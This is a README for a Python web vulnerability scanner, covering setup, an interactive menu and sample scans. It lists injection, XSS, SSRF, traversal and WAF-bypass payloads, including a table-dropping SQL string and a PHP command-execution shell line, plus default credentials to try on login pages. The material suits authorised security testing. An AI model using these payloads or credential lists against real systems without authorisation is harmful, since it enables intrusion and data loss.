# 🛡️ Advanced Vulnerability Scanner Tool

A comprehensive Python-based security testing tool for identifying web application vulnerabilities. Supports SQL Injection, XSS, SSRF, Code Injection, NoSQL Injection, Directory Traversal, and WAF Bypass attacks. Features interactive CLI, automatic technology detection, default credential checking, and detailed vulnerability reporting.

**📌 For GET & POST request examples and OS-specific instructions, see sections below.**

---

## 📋 Table of Contents

1. [Quick Start](#quick-start)
2. [Installation](#installation)
3. [OS-Specific Execution](#os-specific-execution)
4. [Usage Guide](#usage-guide)
5. [GET vs POST Requests](#get-vs-post-requests)
6. [Vulnerability Types & Payloads](#vulnerability-types--payloads)
7. [Technology Detection](#technology-detection)
8. [Examples & Tutorials](#examples--tutorials)
9. [Default Credentials](#default-credentials)
10. [Advanced Usage](#advanced-usage)
11. [Troubleshooting](#troubleshooting)
12. [Legal Disclaimer](#legal-disclaimer)

---

## ⚡ Quick Start

### Minimum Requirements
- **Python 3.7 or higher**
- **requests library** (`pip install requests`)
- **Administrator/sudo access** (for some system-level operations)

### 30-Second Setup

**Windows (PowerShell):**
```powershell
pip install requests
python vuln_scanner.py
```

**Linux/Mac (Bash/Zsh):**
```bash
pip3 install requests
python3 vuln_scanner.py
```

After running, select option from the menu:
```
===============================================
   VULNERABILITY SCANNER - MAIN MENU
===============================================
1. SQL Injection Testing
2. XSS (Cross-Site Scripting) Testing
3. SSRF (Server-Side Request Forgery) Testing
4. Code Injection Testing
5. NoSQL Injection Testing
6. Directory Traversal Testing
7. WAF Bypass Testing
8. Detect Web Technologies
9. Check Default Credentials
0. Exit
===============================================
Choose an option (0-9):
```

---

## 🔧 Installation

### Prerequisites
Ensure Python 3.7+ is installed:

```bash
# Windows (PowerShell)
python --version

# Linux/Mac
python3 --version
```

### Install Dependencies

**Option 1: Using pip (Recommended)**

```bash
# Windows
pip install requests

# Linux/Mac
pip3 install requests
```

**Option 2: Using requirements.txt**

Create `requirements.txt`:
```
requests>=2.25.0
```

Then install:
```bash
# Windows
pip install -r requirements.txt

# Linux/Mac
pip3 install -r requirements.txt
```

**Option 3: System Package Manager (Linux)**

```bash
# Debian/Ubuntu
sudo apt-get install python3-requests

# Fedora/CentOS/RHEL
sudo dnf install python3-requests

# Arch Linux
sudo pacman -S python-requests
```

---

## 💻 OS-Specific Execution

### Windows (PowerShell & CMD)

**Method 1: Direct Python Execution (Recommended)**
```powershell
python vuln_scanner.py
```

**Method 2: Python 3 Explicit**
```powershell
python3 vuln_scanner.py
```

**Method 3: Using python.exe Full Path**
```powershell
C:\Users\YourUsername\AppData\Local\Programs\Python\Python310\python.exe vuln_scanner.py
```

**Method 4: As Administrator (Required for some tests)**
```powershell
# Run PowerShell as Administrator, then:
python vuln_scanner.py
```

**Method 5: Batch File (Create scanner.bat)**
```batch
@echo off
python vuln_scanner.py
pause
```
Then double-click `scanner.bat` to run.

**Method 6: With Virtual Environment**
```powershell
# Create virtual environment
python -m venv venv

# Activate it
.\venv\Scripts\Activate.ps1

# Install requests
pip install requests

# Run scanner
python vuln_scanner.py

# Deactivate when done
deactivate
```

**Troubleshooting Windows Issues:**
- If `python` command not found, try `py` instead: `py vuln_scanner.py`
- For encoding errors: `$env:PYTHONIOENCODING="utf-8"`
- For permission denied: Run PowerShell as Administrator

---

### Linux (Bash/Zsh)

**Method 1: Standard Execution**
```bash
python3 vuln_scanner.py
```

**Method 2: Make Script Executable**
```bash
# Add shebang to top of vuln_scanner.py (if not present)
# #!/usr/bin/env python3

chmod +x vuln_scanner.py
./vuln_scanner.py
```

**Method 3: With Virtual Environment (Recommended)**
```bash
# Create virtual environment
python3 -m venv venv

# Activate it
source venv/bin/activate

# Install dependencies
pip install requests

# Run scanner
python3 vuln_scanner.py

# Deactivate when done
deactivate
```

**Method 4: Using Python 3 Explicitly**
```bash
python3 -u vuln_scanner.py
```

**Method 5: Run in Background**
```bash
# Run in background
python3 vuln_scanner.py &

# Run with nohup (survives terminal close)
nohup python3 vuln_scanner.py > scanner.log 2>&1 &

# Check running processes
ps aux | grep vuln_scanner
```

**Method 6: Systemd Service (Advanced)**
Create `/etc/systemd/system/vuln-scanner.service`:
```ini
[Unit]
Description=Vulnerability Scanner Service
After=network.target

[Service]
Type=simple
User=your_username
WorkingDirectory=/path/to/scanner
ExecStart=/usr/bin/python3 /path/to/vuln_scanner.py
Restart=always

[Install]
WantedBy=multi-user.target
```

Then:
```bash
sudo systemctl daemon-reload
sudo systemctl start vuln-scanner
sudo systemctl status vuln-scanner
```

**Troubleshooting Linux Issues:**
- Permission denied: `chmod +x vuln_scanner.py`
- Python not found: Install with `sudo apt-get install python3`
- Module not found: `pip3 install --user requests`

---

### macOS (Bash/Zsh)

**Method 1: Direct Execution**
```bash
python3 vuln_scanner.py
```

**Method 2: With Homebrew**
```bash
# Install Python (if needed)
brew install python3

# Install requests
pip3 install requests

# Run scanner
python3 vuln_scanner.py
```

**Method 3: Virtual Environment (Recommended)**
```bash
# Create virtual environment
python3 -m venv venv

# Activate it
source venv/bin/activate

# Install dependencies
pip install requests

# Run scanner
python3 vuln_scanner.py

# Deactivate
deactivate
```

**Method 4: Using Alias for Quick Access**
Add to `~/.zshrc` or `~/.bash_profile`:
```bash
alias scanner='cd /path/to/scanner && python3 vuln_scanner.py'
```

Then:
```bash
source ~/.zshrc
scanner
```

**Method 5: Create LaunchAgent (Run at Login)**
Create `~/Library/LaunchAgents/com.scanner.plist`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.scanner.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/python3</string>
        <string>/path/to/vuln_scanner.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

**Troubleshooting macOS Issues:**
- Python not found: Install via Homebrew
- Permission denied: `chmod +x vuln_scanner.py`
- Module errors: `pip3 install --user requests`

---

## 📖 Usage Guide

### Interactive Menu System

The scanner provides a user-friendly interactive menu. Start with:

```bash
python vuln_scanner.py
```

You'll see:
```
===============================================
   VULNERABILITY SCANNER - MAIN MENU
===============================================
1. SQL Injection Testing
2. XSS (Cross-Site Scripting) Testing
3. SSRF (Server-Side Request Forgery) Testing
4. Code Injection Testing
5. NoSQL Injection Testing
6. Directory Traversal Testing
7. WAF Bypass Testing
8. Detect Web Technologies
9. Check Default Credentials
0. Exit
===============================================
Choose an option (0-9): 
```

### Step-by-Step Example: SQL Injection Testing

**Step 1: Start Scanner**
```bash
python vuln_scanner.py
```

**Step 2: Select Option 1 (SQL Injection)**
```
Choose an option (0-9): 1
```

**Step 3: Enter Target URL**
```
Enter target URL (e.g., http://example.com/login.php): http://targetsite.com/login.php
```

**Step 4: Enter Parameter Name**
```
Enter parameter name to test (e.g., username, id): username
```

**Step 5: Select HTTP Method**
```
Select HTTP method:
1. GET
2. POST
Choose (1-2): 2
```

**Step 6: Review Results**
The scanner will:
- Inject 40 different SQL payloads
- Test each against the parameter
- Report vulnerabilities found
- Display response times and indicators

**Sample Output:**
```
[+] SQL Injection Scanner
[+] Target: http://targetsite.com/login.php
[+] Parameter: username
[+] Method: POST
[+] Testing 40 SQL injection payloads...

[!] POTENTIAL VULNERABILITY FOUND
    Payload: ' OR '1'='1
    Response Time: 0.45s
    Indicator: Response length changed
    Status: SUSPICIOUS

[*] Scanning complete. 2 potential vulnerabilities found.
[*] Generate report? (y/n):
```

---

## 🔄 GET vs POST Requests

### Understanding GET Requests

**GET requests pass parameters in the URL query string:**

```
URL: http://example.com/search?q=test&category=books
     └─────────────────┬──────────────┬─────────────┘
                       │              │
                     Base URL    Query String (parameters)
```

**GET Request Example:**

Original URL:
```
http://vulnerable-site.com/product.php?id=1
```

SQL Injection payload injected:
```
http://vulnerable-site.com/product.php?id=1' OR '1'='1
```

**When to use GET:**
- Simple parameter passing
- Search queries
- Filtering data
- Pagination
- Public API calls

### Understanding POST Requests

**POST requests pass parameters in the request body (hidden from URL):**

```
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123
└────────┬──────────────┬────────┘
      Parameter 1   Parameter 2
```

**POST Request Example:**

HTML Form:
```html
<form method="POST" action="/login.php">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
```

When submitted with `username=test` and `password=abc123`, the request body contains:
```
username=test&password=abc123
```

**When to use POST:**
- Login forms
- Data submission
- File uploads
- Sensitive information
- Creating/modifying data

### Practical Examples

#### Example 1: GET Request Testing

**Vulnerable URL:**
```
http://shop.example.com/products.php?id=5
```

**Using the Scanner:**
```bash
python vuln_scanner.py

# Select option 1 (SQL Injection)
# Enter URL: http://shop.example.com/products.php
# Enter parameter: id
# Select method: 1 (GET)
```

**What the scanner tests:**
```
GET /products.php?id=5' OR '1'='1 HTTP/1.1
GET /products.php?id=5; DROP TABLE users; -- HTTP/1.1
GET /products.php?id=5' UNION SELECT NULL,NULL,NULL -- HTTP/1.1
... and 37 more payloads
```

**Indicators of vulnerability:**
- Different response content
- Database error messages
- Response time delays (time-based)
- Page displays different data

---

#### Example 2: POST Request Testing

**Vulnerable Form:**
```html
<form method="POST" action="/authenticate.php">
    <input type="text" name="email">
    <input type="text" name="password">
    <button type="submit">Login</button>
</form>
```

**Using the Scanner:**
```bash
python vuln_scanner.py

# Select option 1 (SQL Injection)
# Enter URL: http://example.com/authenticate.php
# Enter parameter: email
# Select method: 2 (POST)
```

**What the scanner tests:**
```
POST /authenticate.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=' OR '1'='1&password=anything
```

```
POST /authenticate.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=admin' --&password=anything
```

And so on for all 40 SQL injection payloads.

---

#### Example 3: XSS (GET) Testing

**Vulnerable URL:**
```
http://blog.example.com/post.php?comment=test
```

**Scanner Test:**
```bash
# Select option 2 (XSS Testing)
# Enter URL: http://blog.example.com/post.php
# Enter parameter: comment
# Select method: 1 (GET)
```

**Payloads tested:**
```
GET /post.php?comment=<img src=x onerror="alert('XSS')">
GET /post.php?comment=<svg onload=alert('XSS')>
GET /post.php?comment="><script>alert('XSS')</script>
... and 35 more XSS payloads
```

**Vulnerability indicators:**
- Script tags appear in response
- JavaScript execution in browser
- HTML entities not properly escaped

---

#### Example 4: POST Request (XSS Testing)

**Vulnerable Form:**
```html
<form method="POST" action="/comment.php">
    <textarea name="comment"></textarea>
    <button type="submit">Post Comment</button>
</form>
```

**Scanner Test:**
```bash
# Select option 2 (XSS Testing)
# Enter URL: http://example.com/comment.php
# Enter parameter: comment
# Select method: 2 (POST)
```

**Request Body Payloads:**
```
comment=<img src=x onerror="alert('XSS')">
comment=<iframe src="javascript:alert('XSS')"></iframe>
comment=<svg/onload=alert('XSS')>
... and 35 more
```

---

### HTTP Method Comparison Table

| Feature | GET | POST |
|---------|-----|------|
| **Parameter Location** | URL Query String | Request Body |
| **Visible in URL** | Yes ✓ | No |
| **Data Size Limit** | ~2KB | ~4GB |
| **Caching** | Cached by default | Not cached |
| **Security** | Less secure | More secure |
| **Use Case** | Retrieval | Submission |
| **Bookmarkable** | Yes | No |
| **Browser History** | Visible | Hidden |

---

### Common Testing Scenarios

#### Scenario 1: Search Functionality (GET)
```
Normal: http://shop.com/search?q=laptop
Test:   http://shop.com/search?q=laptop' OR '1'='1
```

#### Scenario 2: Login Form (POST)
```
Form Fields: username, password
Test Data: 
  - username: admin' OR '1'='1 --
  - password: anything
```

#### Scenario 3: Product Filtering (GET)
```
Normal: http://shop.com/products?category=electronics&price=100
Test:   http://shop.com/products?category=electronics' OR '1'='1&price=100
```

#### Scenario 4: Contact Form (POST)
```
Form Fields: name, email, message
Test Data:
  - name: John<script>alert('XSS')</script>
  - email: test@example.com
  - message: Testing XSS vulnerability
```

---

## 🎯 Vulnerability Types & Payloads

### 1. SQL Injection (40 Payloads)

**What it is:** Inserting SQL commands into input fields to manipulate database queries.

**9 Categories:**
- Basic attacks (8 payloads)
- Time-based blind (6 payloads)
- Boolean-based blind (4 payloads)
- Error-based (6 payloads)
- Stacked queries (4 payloads)
- Advanced techniques (4 payloads)
- PostgreSQL specific (2 payloads)
- Oracle specific (3 payloads)
- MongoDB (3 payloads)

**Example Payloads:**
```
' OR '1'='1
' OR 1=1 --
'; DROP TABLE users; --
' UNION SELECT NULL,NULL,NULL --
```

**How to Test with Scanner:**
```bash
python vuln_scanner.py
# Select: 1 (SQL Injection Testing)
# URL: http://target.com/login.php
# Parameter: username
# Method: 2 (POST)
```

---

### 2. XSS - Cross-Site Scripting (38 Payloads)

**What it is:** Injecting malicious JavaScript code that runs in victims' browsers.

**9 Categories:**
- Basic event handlers (5 payloads)
- Event-based attacks (6 payloads)
- Encoded attacks (4 payloads)
- Mutation-based (4 payloads)
- SVG-based (3 payloads)
- HTML5 attributes (4 payloads)
- Polyglot attacks (3 payloads)
- Attribute breaking (3 payloads)
- Creative combinations (6 payloads)

**Example Payloads:**
```
<img src=x onerror="alert('XSS')">
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>
<iframe src="javascript:alert('XSS')"></iframe>
```

**How to Test:**
```bash
python vuln_scanner.py
# Select: 2 (XSS Testing)
# URL: http://target.com/post.php
# Parameter: comment
# Method: 1 (GET)
```

---

### 3. SSRF - Server-Side Request Forgery (27 Payloads)

**What it is:** Making the server perform unintended requests to internal or external systems.

**6 Categories:**
- Localhost bypass (5 payloads)
- Internal IP targeting (4 payloads)
- Cloud metadata (5 payloads)
- Localhost filter bypass (4 payloads)
- Protocol tricks (4 payloads)
- Filter evasion (5 payloads)

**Example Payloads:**
```
http://127.0.0.1:8080
http://0.0.0.0
http://169.254.169.254/latest/meta-data/
http://[::1]
```

**How to Test:**
```bash
python vuln_scanner.py
# Select: 3 (SSRF Testing)
# URL: http://target.com/fetch.php
# Parameter: url
# Method: 1 (GET)
```

---

### 4. Code Injection (32 Payloads)

**What it is:** Injecting code (PHP, Python, etc.) to be executed by the server.

**8 Categories:**
- Command injection (4 payloads)
- PHP code injection (4 payloads)
- Python code injection (3 payloads)
- Node.js code injection (3 payloads)
- Java code injection (4 payloads)
- Perl code injection (3 payloads)
- Template injection (4 payloads)
- Expression language injection (3 payloads)

**Example Payloads:**
```
; ls -la
<?php system($_GET['cmd']); ?>
__import__('os').system('id')
require('child_process').exec('whoami')
```

**How to Test:**
```bash
python vuln_scanner.py
# Select: 4 (Code Injection Testing)
# URL: http://target.com/execute.php
# Parameter: code
# Method: 2 (POST)
```

---

### 5. NoSQL Injection (16 Payloads)

**What it is:** Injecting NoSQL query operators to manipulate database queries.

**5 Categories:**
- MongoDB basic (4 payloads)
- MongoDB advanced (3 payloads)
- MongoDB blind (2 payloads)
- CouchDB (3 payloads)
- Firebase (4 payloads)

**Example Payloads:**
```
{"$ne": null}
{"$gt": ""}
db.users.find({username: {$regex: ".*"}})
```

**How to Test:**
```bash
python vuln_scanner.py
# Select: 5 (NoSQL Injection Testing)
# URL: http://target.com/api/users
# Parameter: filter
# Method: 2 (POST)
```

---

### 6. Directory Traversal (25 Payloads)

**What it is:** Accessing files outside the intended directory using path traversal.

**7 Categories:**
- Basic traversal (4 payloads)
- Encoded traversal (3 payloads)
- Null byte injection (2 payloads)
- Unicode encoding (3 payloads)
- Windows paths (4 payloads)
- Linux paths (4 payloads)
- App-specific (2 payloads)

**Example Payloads:**
```
../../../etc/passwd
..\\..\\..\\windows\\win.ini
....//....//....//etc/passwd
```

**How to Test:**
```bash
python vuln_scanner.py
# Select: 6 (Directory Traversal Testing)
# URL: http://target.com/file.php
# Parameter: path
# Method: 1 (GET)
```

---

### 7. WAF Bypass (23 Payloads)

**What it is:** Techniques to evade Web Application Firewall (WAF) filters.

**8 Categories:**
- Case variation (2 payloads)
- HTML encoding (3 payloads)
- Comment insertion (2 payloads)
- Whitespace tricks (2 payloads)
- Polyglot payloads (3 payloads)
- Filter evasion (4 payloads)
- Encoding tricks (2 payloads)

**Example Payloads:**
```
' Or '1'='1
' oR '1'='1
%27 OR %271%27=%271
```

**How to Test:**
```bash
python vuln_scanner.py
# Select: 7 (WAF Bypass Testing)
# URL: http://target.com/search.php
# Parameter: q
# Method: 1 (GET)
```

---

## 🔍 Technology Detection

**Automatically detects:**
- Web servers (Apache, Nginx, IIS, etc.)
- CMS platforms (WordPress, Drupal, Joomla)
- Frameworks (Angular, React, Vue, Bootstrap)
- Programming languages (PHP, ASP.NET, Node.js, Python)
- Databases (MySQL, PostgreSQL, MongoDB)
- CDNs and security services
- Outdated software versions

**How to Use:**
```bash
python vuln_scanner.py
# Select: 8 (Detect Web Technologies)
# Enter URL: http://target.com
```

**Sample Output:**
```
[+] Technology Detection
[+] Target: http://target.com

[*] Detected from HTTP Headers:
    - Server: nginx/1.18.0
    - X-Powered-By: PHP/7.4.3

[*] Detected from HTML Content:
    - WordPress (detected in HTML comments)
    - jQuery
    - Bootstrap

[*] Detected from Common Paths:
    - /wp-admin/ (WordPress)
    - /phpmyadmin/ (MySQL Admin)

[*] Final Detection: WordPress on Nginx with PHP
```

---

## 📚 Examples & Tutorials

### Example 1: Testing a Vulnerable WordPress Site

```bash
python vuln_scanner.py

# Option 1: Detect Technologies
# URL: http://vulnerable-wordpress.local
# Output: WordPress 5.8 detected

# Option 9: Check Default Credentials
# Select WordPress
# Tries: admin/admin, admin/password, admin/wordpress123

# Option 1: SQL Injection
# URL: http://vulnerable-wordpress.local/wp-admin/edit.php
# Parameter: s
# Method: GET
```

---

### Example 2: Testing a Custom Application Form

```bash
python vuln_scanner.py

# Option 2: XSS Testing
# URL: http://myapp.local/feedback.php
# Parameter: message
# Method: POST
```

---

### Example 3: Batch Technology Detection

Create `batch_scanner.py`:
```python
from vuln_scanner import TechDetector

targets = [
    'http://example1.com',
    'http://example2.com',
    'http://example3.com'
]

detector = TechDetector()
for target in targets:
    print(f"\n[*] Scanning: {target}")
    techs = detector.detect_technologies(target)
    for tech in techs:
        print(f"    - {tech}")
```

Run:
```bash
python batch_scanner.py
```

---

## 🔑 Default Credentials

**33 common default credentials tested:**

### Web Servers
- Apache: admin/admin, admin/password
- Nginx: admin/admin
- IIS: Administrator/password

### CMS Platforms
- WordPress: admin/admin, admin/password, admin/wordpress123
- Drupal: admin/admin, admin/drupal123
- Joomla: admin/admin, admin/joomla123

### Databases
- MySQL: root/root, root/password
- PostgreSQL: postgres/postgres
- MongoDB: admin/admin (no auth)

### SSH/FTP
- SSH: root/root, admin/admin
- FTP: anonymous/anonymous, ftp/ftp

### Routers/IoT
- Router: admin/admin, admin/password
- Default: root/12345

**How to Check:**
```bash
python vuln_scanner.py
# Select: 9 (Check Default Credentials)
# Enter URL: http://target.com/admin
# Select target type (WordPress, Drupal, etc.)
```

---

## 🔧 Advanced Usage

### Programmatic Usage (Import as Module)

```python
from vuln_scanner import VulnScanner, PayloadDatabase, TechDetector

# Initialize scanner
scanner = VulnScanner()

# Get specific payloads
sql_payloads = PayloadDatabase.get_sql_injection_payloads()
print(f"Available SQL payloads: {len(sql_payloads)}")

# Detect technologies
detector = TechDetector()
techs = detector.detect_technologies('http://example.com')

# Scan for vulnerabilities
results = scanner.scan_sql_injection(
    'http://example.com/search.php',
    'q',
    method='GET'
)

# Generate report
report = scanner.generate_report()
print(report)
```

---

### Custom Payload Testing

```python
from vuln_scanner import VulnScanner

scanner = VulnScanner()

# Test custom payload
result = scanner._test_payload(
    'http://example.com/page.php',
    'id',
    "1' OR '1'='1",
    'GET'
)

if result:
    print("Payload successful")
    print(f"Response status: {result.status_code}")
    print(f"Response length: {len(result.text)}")
```

---

### JSON Export

```python
import json
from vuln_scanner import VulnScanner

scanner = VulnScanner()
scanner.scan_sql_injection(
    'http://example.com/search.php',
    'q',
    method='GET'
)

# Export results
report = scanner.generate_report()
with open('scan_report.json', 'w') as f:
    json.dump(report, f, indent=2)

print("Report saved to scan_report.json")
```

---

## 🐛 Troubleshooting

### Issue: "ModuleNotFoundError: No module named 'requests'"

**Solution:**
```bash
# Windows
pip install requests

# Linux/Mac
pip3 install requests
```

---

### Issue: "Connection refused" or "Network error"

**Possible causes:**
1. Target server is down
2. Network connection issue
3. Firewall blocking requests
4. URL format incorrect

**Solution:**
```bash
# Verify URL format
# Correct: http://example.com/page.php
# Wrong: example.com/page.php (missing http://)

# Test connection
ping example.com
```

---

### Issue: "SSL/TLS Certificate Error"

**Workaround (for testing only):**
Edit `vuln_scanner.py` line with requests call:
```python
response = requests.get(url, timeout=5, verify=False)  # Add verify=False
```

---

### Issue: No vulnerabilities detected (even on vulnerable sites)

**Possible causes:**
1. WAF blocking payloads
2. Wrong parameter name
3. Wrong HTTP method (GET vs POST)
4. URL not accessible

**Solution:**
1. Try with WAF bypass payloads (option 7)
2. Verify parameter name in HTML source
3. Try other HTTP method
4. Check URL accessibility manually

---

### Issue: Python command not found on Linux/Mac

**Solution:**
```bash
# Check Python version
which python3
which python

# Install if needed
# Ubuntu/Debian
sudo apt-get install python3 python3-pip

# macOS (Homebrew)
brew install python3

# Fedora/CentOS
sudo dnf install python3 python3-pip
```

---

### Issue: Unicode/Encoding errors on Windows

**Solution:**
```powershell
# Set encoding to UTF-8
$env:PYTHONIOENCODING="utf-8"
python vuln_scanner.py

# Or add to script start
```

---

## ⚖️ Legal Disclaimer

**IMPORTANT:** This tool is for authorized security testing only.

**Legal Requirements:**
- ✓ You must have explicit written permission to test any website/application
- ✓ Testing without authorization is ILLEGAL and punishable by law
- ✓ Only use on systems you own or have permission to test
- ✓ Do not use for malicious purposes
- ✓ Unauthorized access to computer systems violates laws like:
  - Computer Fraud and Abuse Act (CFAA) - USA
  - Computer Misuse Act 1990 - UK
  - Criminal Code - Canada
  - Similar laws in other countries

**Legitimate Uses:**
- ✓ Penetration testing with written authorization
- ✓ Bug bounty programs
- ✓ Security research on your own systems
- ✓ Educational purposes in controlled environments
- ✓ Authorized security assessments

**The authors assume NO LIABILITY for misuse or damage caused by this tool.**

---

## 📞 Support & Resources

### Getting Help

1. **Check examples:** `python scanner_examples.py`
2. **Read documentation:** `VULN_SCANNER_README.md`
3. **Quick reference:** `SCANNER_QUICK_START.md`

### Recommended Learning Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/

---

## 📝 File Reference

| File | Purpose |
|------|---------|
| `vuln_scanner.py` | Main scanner with all features |
| `scanner_examples.py` | 13 working examples |
| `README.md` | This file - complete guide |
| `VULN_SCANNER_README.md` | Alternative documentation |
| `SCANNER_QUICK_START.md` | Quick reference |
| `INDEX.md` | File navigation guide |

---

**Last Updated:** November 12, 2025  
**Version:** 1.0.0  
**Vulnerability Payloads:** 234+  
**Status:** Production Ready ✓

For more information, see `SCANNER_QUICK_START.md` or run `python scanner_examples.py` for live demonstrations.
